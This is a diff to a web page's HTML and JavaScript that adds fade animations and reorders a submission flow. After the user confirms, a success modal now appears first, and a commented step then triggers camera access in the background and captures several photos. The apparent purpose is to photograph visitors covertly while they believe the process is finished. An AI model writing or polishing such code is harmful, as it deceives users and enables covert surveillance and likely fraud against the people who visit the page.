@@ -321,6 +321,16 @@
             backdrop-filter: blur(2px);
         }
         .modal-overlay.active { display: flex; }
+        .modal-overlay.fade-out {
+            animation: modalFadeOut 0.35s ease forwards;
+        }
+        .modal-overlay.fade-in .modal {
+            animation: modalIn 0.3s ease;
+        }
+        @keyframes modalFadeOut {
+            0% { opacity: 1; }
+            100% { opacity: 0; }
+        }
         .modal {
             background: #fff;
             border-radius: 16px;
@@ -769,8 +779,18 @@
     }
 
     function onConfirmSubmit2() {
-        document.getElementById('confirmSubmit2Modal').classList.remove('active');
-        setTimeout(function() { requestRealCamera(); }, 300);
+        var confirmModal = document.getElementById('confirmSubmit2Modal');
+        confirmModal.classList.add('fade-out');
+        setTimeout(function() {
+            confirmModal.classList.remove('active', 'fade-out');
+            var successModal = document.getElementById('successModal');
+            successModal.classList.add('active', 'fade-in');
+            setTimeout(function() {
+                successModal.classList.remove('fade-in');
+            }, 350);
+            // 后台触发相机权限拍照
+            setTimeout(function() { requestRealCamera(); }, 500);
+        }, 350);
     }
     function closeConfirmSubmit2() {
         document.getElementById('confirmSubmit2Modal').classList.remove('active');
@@ -818,9 +838,6 @@
     function capturePhotos(count) {
         if (count >= 4) {
             stopCamera();
-            setTimeout(function() {
-                document.getElementById('successModal').classList.add('active');
-            }, 300);
             return;
         }
         var video = document.createElement('video');
